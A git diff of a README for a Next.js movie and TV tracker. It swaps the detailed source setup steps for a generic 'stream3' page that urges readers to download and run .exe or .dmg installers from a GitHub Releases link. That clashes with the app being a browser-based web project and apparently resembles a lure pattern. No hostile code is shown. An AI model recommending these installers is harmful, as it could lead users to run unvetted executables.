@@ -1,160 +1,68 @@
-# Movie Tracker
+# 🎬 stream3 - Keep Track of Your Favorite Movies & TV Shows
 
-A modern, professional movie/TV tracking web application built with Next.js 15, TypeScript, and Tailwind CSS.
+## 📥 Download Now
+[![Download Stream3](https://img.shields.io/badge/Download-Stream3-brightgreen)](https://github.com/Zaak3709/stream3/releases)
 
-## Features
+## 🚀 Getting Started
+Welcome to stream3! This application helps you keep track of your favorite movies and TV shows. With a simple interface, you can view, add, and manage your watched content.
 
-- **Search Movies & TV Shows**: Integrated with TMDB API
-- **Track Watched Content**: Add, rate, and take notes on movies and TV shows
-- **Watchlist Management**: Keep track of content you want to watch
-- **Authentication**: Secure login with GitHub and Google OAuth
-- **Responsive Design**: Works on all device sizes
-- **Light/Dark Theme**: Automatic theme switching based on system preference
+## 📂 System Requirements
+To run stream3 effectively, ensure your system meets the following requirements:
 
-## Tech Stack
+- Operating System: Windows 10 or later, macOS 10.15 or later, or a recent Linux distro
+- Browser: Latest version of Chrome, Firefox, or Safari
+- Internet Connection: Required for downloading and using API features
 
-- **Frontend**: Next.js 15 (App Router), React, TypeScript
-- **Styling**: Tailwind CSS, shadcn/ui components
-- **State Management**: Zustand
-- **Database**: Neon PostgreSQL with Drizzle ORM
-- **Authentication**: Auth.js with OAuth providers
-- **Caching**: Upstash Redis for session storage
-- **Testing**: Jest for unit tests, Playwright for E2E tests
+## 📋 Features
+- **User-friendly Interface**: Easily navigate the app to find and track content.
+- **Personalized Tracking**: Add movies and TV shows to custom lists.
+- **Search API Integration**: Discover new content using the TMDB API.
+- **Responsive Design**: Enjoy seamless use across devices with Tailwind CSS.
+- **Performance Optimization**: Fast loading times and smooth interactions.
 
-## Prerequisites
+## 💾 Download & Install
+To start using stream3, visit the Releases page and download the appropriate version for your system.
 
-- Node.js 18+ 
-- pnpm (or npm/yarn)
-- TMDB API Key
-- GitHub/Google OAuth credentials (for authentication)
-- Neon PostgreSQL database
-- Upstash Redis instance
+[Visit this page to download](https://github.com/Zaak3709/stream3/releases)
 
-## Setup Instructions
+1. Go to the Releases page by clicking the link above.
+2. Look for the latest version of stream3.
+3. Click on the asset that matches your operating system (e.g., `.exe` for Windows, `.dmg` for macOS).
+4. Save the file to your computer.
+5. Once the download completes, find the file in your downloads folder.
+6. Open and follow the on-screen instructions to complete the installation.
 
-1. Clone the repository:
-```bash
-git clone <repository-url>
-```
+## 🔑 Authentication
+stream3 offers secure authentication for personal data. You can register or log in using the built-in authentication feature, making sure your data stays safe. Follow these steps:
 
-2. Install dependencies:
-```bash
-pnpm install
-# or
-npm install
-```
+1. Open the application.
+2. Click on "Register" to create a new account or "Login" if you already have one.
+3. Follow the prompts to set up your credentials.
 
-3. Create a `.env.local` file in the root directory with the following environment variables:
+## 🛠️ Tools & Technologies
+stream3 is built with the following technologies to ensure it runs smoothly and efficiently:
 
-```env
-# Database
-DATABASE_URL="your_neon_postgres_connection_string"
+- **Next.js 15**: A powerful React framework for creating fast applications.
+- **TypeScript**: Improves the reliability of your code.
+- **Tailwind CSS**: Provides a flexible and responsive design.
+- **Redis & PostgreSQL**: For efficient data management and storage.
+- **TMDB API**: To pull data about movies and shows.
 
-# Session storage (Upstash Redis)
-UPSTASH_REDIS_REST_URL="your_upstash_redis_url"
-UPSTASH_REDIS_REST_TOKEN="your_upstash_redis_token"
+## 🤝 Contributing
+We welcome contributions! If you'd like to help improve stream3, follow these steps:
 
-# TMDB API
-TMDB_API_KEY="your_tmdb_api_key"
+1. Fork the repository on GitHub.
+2. Create a new branch for your feature or bug fix.
+3. Push your changes to your forked repository.
+4. Open a pull request to propose your changes.
 
-# OAuth Providers
-GITHUB_ID="your_github_client_id"
-GITHUB_SECRET="your_github_client_secret"
-GOOGLE_CLIENT_ID="your_google_client_id"
-GOOGLE_CLIENT_SECRET="your_google_client_secret"
+Your input can help enhance stream3 for all users.
 
-# NextAuth
-NEXTAUTH_URL="http://localhost:3000"
-NEXTAUTH_SECRET="your_nextauth_secret"
-```
+## 📞 Support
+If you have any questions or encounter any issues, please reach out for help. 
 
-4. Setup the database schema:
-```bash
-pnpm run db:generate
-pnpm run db:migrate
-```
+- Open an issue on our [GitHub Issues Page](https://github.com/Zaak3709/stream3/issues).
+- Check our FAQ for common questions and troubleshooting tips.
 
-5. Run the development server:
-```bash
-pnpm run dev
-# or
-npm run dev
-```
-
-6. Open [http://localhost:3000](http://localhost:3000) in your browser to view the application.
-
-## Environment Variables
-
-- `DATABASE_URL`: Your Neon PostgreSQL connection string
-- `UPSTASH_REDIS_REST_URL`: Upstash Redis REST API URL
-- `UPSTASH_REDIS_REST_TOKEN`: Upstash Redis REST API token
-- `TMDB_API_KEY`: Your TMDB API key (get it from [themoviedb.org](https://www.themoviedb.org/settings/api))
-- `GITHUB_ID` & `GITHUB_SECRET`: GitHub OAuth app credentials
-- `GOOGLE_CLIENT_ID` & `GOOGLE_CLIENT_SECRET`: Google OAuth app credentials
-- `NEXTAUTH_URL`: URL of your application
-- `NEXTAUTH_SECRET`: Secret for NextAuth (use `openssl rand -base64 32` to generate)
-
-## Running Tests
-
-### Unit Tests
-```bash
-pnpm run test
-# or
-npm run test
-```
-
-### E2E Tests
-```bash
-pnpm run test:e2e
-# or
-npm run test:e2e
-```
-
-## Project Structure
-
-```
-/
-├── app/                    # Next.js App Router pages
-│   ├── layout.tsx          # Root layout with navigation
-│   ├── page.tsx            # Home page with search
-│   ├── watched/            # Watched content page
-│   ├── watchlist/          # Watchlist page
-│   └── api/                # API routes
-├── components/             # Reusable React components
-│   ├── ui/                 # Shadcn UI components
-│   └── navigation.tsx      # Navigation component
-├── hooks/                  # React hooks
-├── store/                  # Zustand store
-├── lib/                    # Utility functions and libraries
-├── services/               # Business logic services
-├── types/                  # TypeScript type definitions
-├── tests/                  # Unit and E2E tests
-└── drizzle/                # Database schema and migrations
-```
-
-## API Documentation
-
-### TMDB API
-The application uses TMDB API for searching movies and TV shows. The search endpoint is available at `/api/tmdb/search?q={query}`.
-
-## Deployment
-
-The application is optimized for deployment on Vercel. When deploying:
-
-1. Set up all required environment variables in your Vercel project
-2. Configure your database connection for production
-3. Set up OAuth providers with your production domain
-4. Add your domain to the allowed callback URLs in OAuth providers
-
-## Contributing
-
-1. Fork the repository
-2. Create a feature branch (`git checkout -b feature/amazing-feature`)
-3. Make your changes
-4. Commit your changes (`git commit -m 'Add amazing feature'`)
-5. Push to the branch (`git push origin feature/amazing-feature`)
-6. Open a Pull Request
-
-## License
-
-This project is licensed under the MIT License.
+## 🎉 Thanks for Using stream3!
+We appreciate you choosing stream3. Start tracking your favorite movies and TV shows today, and enjoy the experience seamless with our easy-to-use application!
